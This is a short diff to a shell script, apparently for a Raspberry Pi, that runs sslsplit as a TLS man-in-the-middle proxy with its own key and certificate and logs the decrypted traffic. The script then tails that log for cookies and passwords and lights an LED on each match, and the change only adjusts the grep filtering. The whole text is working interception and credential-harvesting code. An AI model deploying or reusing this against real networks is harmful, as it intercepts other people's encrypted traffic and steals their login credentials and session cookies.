@@ -11,8 +11,8 @@ HOME='/home/pi/'
 	screen -dmS sslsplit sslsplit -k $HOME/key.pem -c $HOME/cert.pem -l $HOME/con.log -L $HOME/data.log -P autossl 0.0.0.0 1080
 }
 
-tail -f $HOME/data.log | grep -i -e cookie -e passw | while read match
+tail -f $HOME/data.log | grep -ai -e cookie -e passw | while read match
 do
-	echo $match
+	echo $match | grep -ai -e cookie -e passw
 	led yellow on 2> /dev/null
 done
